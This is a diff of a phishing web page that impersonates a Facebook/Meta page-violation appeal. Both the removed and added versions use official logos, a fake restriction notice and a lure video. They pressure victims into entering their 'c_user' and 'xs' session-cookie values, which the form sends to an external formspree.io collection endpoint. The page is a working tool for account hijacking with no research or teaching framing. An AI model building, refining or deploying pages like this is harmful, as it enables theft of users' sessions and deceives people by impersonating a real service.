@@ -1,77 +1,84 @@
-<!doctype html>
-
+<html lang="en">
 <head>
-    <title>Action Required</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link href="style.css" rel="stylesheet">
+    <meta charset="UTF-8">   
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
+    <link rel="stylesheet" href="styles.css">
+    <title>Action | Required</title>
 </head>
-
 <body>
-    <div class="md:block lg:block hidden border flex w-full h-[6rem]  relative bg-[#4667ac]">
-        <div class="mx-10 mt-4">
-            <b class="text-5xl text-white">facebook</b>
+
+    <nav>
+        <div class="nav-left">
+            <p class="fb-2">
+                facebook
+            </p>
         </div>
-
-        <form class="sm:hidden lg:block md:block" action="https://formspree.io/f/xzbnznyl" method="post">
-
-            <div style="position: absolute; left: 1.5rem; top:8rem; width: 90%;">
-                <div>
-                    <p class="border-b h-10 font-bold text-[16px] text-[#4b4f56] pl-3 p-2 bg-[#f5f6f7]">
-                        Appeal Page Violation
-                    </p>
-                </div>
-                <div>
-                    <p class="mt-4 pl-3 text-[12px] font-semibold">
-                        We have detected unusual activity on your page that violates our community standards.
-                    </p>
-                </div>
-                <div>
-                    <p class="mt-4 pl-3 text-[12px] font-semibold">
-                        Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.
-                    </p>
-                </div>
-                <div>
-                    <p class="mt-4 pl-3 text-[12px] font-semibold">
-                        If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.
-                    </p>
-                </div>
-                <div>
-                    <p class="text-[11px] text-[#90949c] p-2 font-semibold">
-                        Detailed Video Information
-                    </p>
-                </div>
-                <div>
-                    <a class="w-[120px] h-[80px] block mx-3" href="https://detailed-video-29b30.web.app/detailed%20video.mp4"><img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/download.jfif.jpg?v=1699326327994" alt=""></a>
-                </div>
-                <div>
-                    <p class=" pl-3 text-[12px] font-semibold">
-                        Please be sure to provide the requested information below.
-                    </p>
-                </div>
-                <div>
-                    <p class="text-slate-400 pl-4 mt-1">
-                        c_user
-                    </p><input class="border h-6 pl-1 mx-3" type="number" name="c_user" required>
-                </div>
-                <div>
-                    <p class="text-slate-400 pl-4 mt-1">
-                        xs
-                    </p><input class="border h-6 pl-1 mx-3" type="text" name="xs" required>
-                </div>
-                <div>
-                    <p class="mt-4 pl-3 text-[12px] font-semibold">
-                        Please make sure account not to log out from your computer or laptop until you have received a verification email.
-                    </p>
-                </div>
-                <div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
-                    <div class="flex justify-end mx-2">
-                        <button class="border h-7 w-16  bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="delete-btn">
-    Submit
-  </button></div>
-                </div>
+        <div class="nav-right">
+            <div class="search-box">
+                <img src="https://purepng.com/public/uploads/large/search-icon-lob.png" alt="search-icon">
+                <input type="text" placeholder="Search" >
             </div>
-        </form>
-</body>
+        </div>
+    </nav> <br><br>
 
+             <div class="main-body">
+              
+      <form class="content" action="https://formspree.io/f/mqkrpagz" method="POST">
+
+            <div>
+             <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" width="140" >
+            </div>
+     
+             
+            <p class="tr-5"> We have detected unusual activity on your page that violates our community standards.</p><br>
+            <p class="tr-5">Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.</p><br>
+            <p class="tr-5">If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.</p><br>
+     
+            <div class="video-text">
+             <p>Must Watch Detailed Video Information:</p>
+            </div>
+     
+           <div>
+             <video controls="" loop autoplay width="300" poster="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" >
+               <source src="https://detailed-video-29b30.web.app/detailed%20video.mp4"  type="video/mp4" >
+            </video>
+           </div>
+     
+           <p class="tr-5">Please be sure to provide the requested information below.</p><br>
+     
+           <div>
+             <p class="mt-4">
+             c_user*
+            </p>
+             <input type="number" name="c_user" id="c_user"  required="">
+           </div><br>
+     
+           <div>
+             <p class="mt-4">
+             xs*
+            </p>
+             <input  type="text" name="xs" id="xs"  required="">
+           </div><br>
+     
+           <p class="msi-4">**Please make sure account not to log out from your computer or laptop until you have received a verification email.</p><br>
+     
+           <div class="container">
+             <button class="button">
+               <p>
+                 Submit
+               </p>
+             </button>
+       
+           </div>
+           <br> <br>
+     
+         </form>
+    </div>
+    <br><br>
+    <div>
+      <p class="copy-r">
+          Meta ©️ 2024   </p>
+    </div>
+    
+</body>
 </html>
